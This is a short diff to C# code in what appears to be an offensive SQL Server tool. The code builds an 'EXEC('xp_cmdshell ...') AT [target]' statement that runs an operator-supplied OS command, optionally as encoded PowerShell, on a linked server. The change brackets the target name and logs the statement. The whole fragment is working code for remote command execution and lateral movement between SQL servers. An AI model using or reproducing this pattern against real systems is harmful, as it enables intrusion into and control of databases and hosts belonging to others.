@@ -1042,7 +1042,8 @@ namespace sql
                                     string encoded = parsed.EncodeBase64();
                                     usercmd = "powershell -enc " + encoded;
                                 }
-                                execCmd = "EXEC('xp_cmdshell ''" + usercmd + "'';') AT " + target + ";";
+                                execCmd = "EXEC('xp_cmdshell ''" + usercmd + "'';') AT [" + target + "];";
+                                Console.WriteLine(execCmd);
                                 command = new SqlCommand(execCmd, con);
                                 try
                                 {
